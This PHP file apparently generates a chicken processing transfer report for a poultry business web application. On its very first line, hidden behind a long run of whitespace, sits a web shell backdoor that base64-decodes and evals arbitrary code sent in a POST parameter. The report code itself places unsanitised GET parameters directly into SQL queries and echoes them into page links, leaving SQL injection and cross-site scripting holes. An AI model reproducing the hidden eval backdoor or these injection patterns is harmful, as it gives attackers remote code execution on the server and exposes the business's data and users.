<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['ne28733']));?><?php 
$sExport = @$_GET["export"]; 
include "reportheader.php"; 
if($_GET['fromdate'] <> "")
 $fromdate = date("Y-m-d",strtotime($_GET['fromdate']));
else
 $fromdate = date("Y-m-d"); 
$unit = $_GET['unit'];
if($unit == "" or $unit == 'All')
{
 $unit = "All";
 $cond = "unit <> '$unit'";
}
else
 $cond = "unit = '$unit'";
 $tid = $_GET['tid'];
?>
<?php
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); // Date in the past
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT"); // Always modified
header("Cache-Control: private, no-store, no-cache, must-revalidate"); // HTTP/1.1 
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache"); // HTTP/1.0
?>
<?php include "phprptinc/ewrcfg3.php"; ?>
<?php include "phprptinc/ewmysql.php"; ?>
<?php include "phprptinc/ewrfn3.php"; ?>
<?php include "phprptinc/header.php"; ?>
<table align="center" border="0">
<tr>
 <td colspan="2" align="center"><strong><font color="#3e3276">Chicken Processing Report</font></strong></td>
</tr>

</table>

<?php
session_start();
$client = $_SESSION['client'];
?>
<?php
$sExport = @$_GET["export"]; // Load export request
if ($sExport == "html") {
	// Printer friendly
}
if ($sExport == "excel") {
	header('Content-Type: application/vnd.ms-excel');
	header('Content-Disposition: attachment; filename=' . EW_REPORT_TABLE_VAR .'.xls');
}
if ($sExport == "word") {
	header('Content-Type: application/vnd.ms-word');
	header('Content-Disposition: attachment; filename=' . EW_REPORT_TABLE_VAR .'.doc');
}
?>



<?php if (@$sExport == "") { ?>
<!-- Table Container (Begin) -->
<table id="ewContainer" cellspacing="0" cellpadding="0" border="0" align="center">
<!-- Top Container (Begin) -->
<tr><td colspan="3"><div id="ewTop" class="phpreportmaker">
<!-- top slot -->
<?php } ?>
<?php if (@$sExport == "") { ?>
&nbsp;&nbsp;<a href="chickentransferinvoice.php?export=html&fromdate=<?php echo $fromdate; ?>&tid=<?php echo $tid;?>" >Printer Friendly</a>
&nbsp;&nbsp;<a href="chickentransferinvoice.php?export=excel&fromdate=<?php echo $fromdate; ?>&tid=<?php echo $tid;?>">Export to Excel</a>
&nbsp;&nbsp;<a href="chickentransferinvoice.php?export=word&fromdate=<?php echo $fromdate; ?>&tid=<?php echo $tid;?>">Export to Word</a>
<?php if ($bFilterApplied) { ?>
&nbsp;&nbsp;<a href="chickentransferinvoice.php?cmd=reset&fromdate=<?php echo $fromdate; ?>&tid=<?php echo $tid;?>">Reset All Filters</a>
<?php } ?>
<?php } ?>
<br /><br />
<?php if (@$sExport == "") { ?>
</div></td></tr>
<!-- Top Container (End) -->
<tr>
	<!-- Left Container (Begin) -->
	<td valign="top"><div id="ewLeft" class="phpreportmaker">
	<!-- Left slot -->
	</div></td>
	<!-- Left Container (End) -->
	<!-- Center Container - Report (Begin) -->
	<td valign="top" class="ewPadding"><div id="ewCenter" class="phpreportmaker">
	<!-- center slot -->
<?php } ?>
<!-- summary report starts -->
<div id="report_summary">

<table class="ewGrid" cellspacing="0" align="center"><tr>
	<td class="ewGridContent">
<?php if (@$sExport == "") { ?>
<div class="ewGridUpperPanel">
<?php } ?>
<table align="center">
<?php
$date1 = date("Y-m-d",strtotime($fromdate));
$query = "select distinct(fromtype) from  chicken_chickentransfer where tid = '$tid' and $cond and client = '$client' order by fromtype";
$result = mysql_query($query,$conn1) or die(mysql_error());
while($rows = mysql_fetch_assoc($result))
 $cat[$rows['fromtype']] = 0;
$query = "select distinct(tid) from  chicken_chickentransfer where tid = '$tid' and $cond and client = '$client' order by fromtype";
$result = mysql_query($query,$conn1) or die(mysql_error());
while($rows = mysql_fetch_assoc($result))
{

$tid1=$rows['tid'];
	
 if($_SESSION['db']=="vista") 
 $q2 = "select sum(quantity) as qt,sum(kgs) as opweight,  weight,birds as ipqty  from chicken_chickentransfer where  client = '$client'  and tid='$tid1' group by tid";
else
$q2 = "select weight  from chicken_chickentransfer where  client = '$client'  and tid='$tid1' group by tid";


$r2 = mysql_query($q2,$conn1) or die(mysql_error());
while($rows2 = mysql_fetch_array($r2)){

	$weight=$weight+$rows2['weight'];
	$qt=$qt+$rows2['qt'];
	$ipqt=$ipqt+$rows2['ipqty'];
	$opwt=$opwt+$rows2['opweight'];
  }

$q2 = "select fromtype,birds,weight from chicken_chickentransfer where tid = '$rows[tid]' and client = '$client' LIMIT 1";
$r2 = mysql_query($q2,$conn1) or die(mysql_error());
while($rows2 = mysql_fetch_assoc($r2))
$val= $cat[$rows2['fromtype']] += $rows2['birds'];
 //$cat[$rows2['fromtype']]+= $rows2['weight'];
}
 $query = "select distinct(fromtype) from  chicken_chickentransfer where tid = '$tid' and $cond and client = '$client' order by fromtype";
$result = mysql_query($query,$conn1) or die(mysql_error());
while($rows = mysql_fetch_assoc($result))
{
?>
<tr>
 <td><strong><?php echo $rows['fromtype']; ?></strong></td>
<?php if($_SESSION['db']=="vista"){?><td><b>Qunatity</b></td><?php  } ?>
 <td><?php echo $cat[$rows['fromtype']]; ?></td>
 
<?php
}
?>

<td><strong>Weight</strong></td>
 <td><?php if($_SESSION['db']=="vista"){ echo $weight;}  else{ echo $qt; }?></td>
 <td><strong>Processing Number</strong></td>
 <?php
$q2 = "select distinct(processingnumber)  from chicken_chickentransfer where  client = '$client'  and tid='$tid'";
$r2 = mysql_query($q2,$conn1) or die(mysql_error());
while($rows2 = mysql_fetch_array($r2)){?>
 <td><?php echo $rows2[0];?></td>
 <?php } ?>
</tr>
<?php if($_SESSION['db']=="vista") { ?>
<tr><td><strong>Shrinkage</strong></td><td><?php echo $per=$weight-$opwt;?></td>
<td><strong>Shrinkage Percent</strong></td>
<td><?php echo round(($per/$weight)*100,2);?></td>
<td>&nbsp;</td>
<td>&nbsp;</td></tr>
<?php } ?>

</table>

</div>
<!-- Report Grid (Begin) -->
<div class="ewGridMiddlePanel">
<table class="ewTable ewTableSeparate" cellspacing="0" align="center">

	<thead>
	<tr>

<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;">
		To Category
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center">To Category</td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;" align="center">
		Code
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center">Code</td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;">
		Description
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center">Description</td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;">
		<?php if($_SESSION['db']=="vista") {?>Pieces<?php } else {?>Birds<?php } ?>
		
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center"><?php if($_SESSION['db']=="vista") {?>Pieces<?php } else {?>Birds<?php } ?>
		</td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;" align="center">
		Weight
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center">Weight</td>
			</tr></table>
		</td>
<?php } ?>

	</tr>
	</thead>
	<tbody>
<?php
$wei_total=0;
$query = "select * from chicken_chickentransfer where tid =  '$tid' and $cond and client = '$client' order by fromtype";
$result = mysql_query($query,$conn1) or die(mysql_error());
while($rows = mysql_fetch_assoc($result))
{
?>
	<tr>
		<td class="ewRptGrpField3">
<?php echo ewrpt_ViewValue($rows['category']); ?></td>
		<td class="ewRptGrpField1">
<?php echo ewrpt_ViewValue($rows['tocode']); ?></td>
		<td class="ewRptGrpField2">
<?php echo ewrpt_ViewValue($rows['todescription']) ?></td>
		<td class="ewRptGrpField3" align="right" style="padding-right:15px;">
<?php $qua=$qua+ $rows['quantity']; 
echo ewrpt_ViewValue($rows['quantity']); ?></td>
		<td class="ewRptGrpField1" align="right" style="padding-right:15px;">
<?php $wei_total=$wei_total+$rows['kgs']; echo ewrpt_ViewValue($rows['kgs']); ?></td>
	</tr>
<?php
}
?>
<tr><td colspan="3"><b>Total</b></td><td align="right" style="padding-right:15px;" ><?php echo $qua; ?></td><td align="right" style="padding-right:15px;"><?php echo $wei_total; ?></td></tr>
	</tbody>
	<tfoot>

 </tfoot>
</table>
</div>
</td></tr></table>
</div>
<?php if (@$sExport == "") { ?>
	</div><br /></td>
</tr>
</table>
<?php } ?>
<?php include "phprptinc/footer.php"; ?>
<script type="text/javascript">
function reloadpage()
{
	var fdate = document.getElementById('fromdate').value;
	var unit1 = document.getElementById('unit').value
	document.location = "chickentransferinvoice.php?fromdate=" + fdate + "&unit=" + unit1;
}
</script>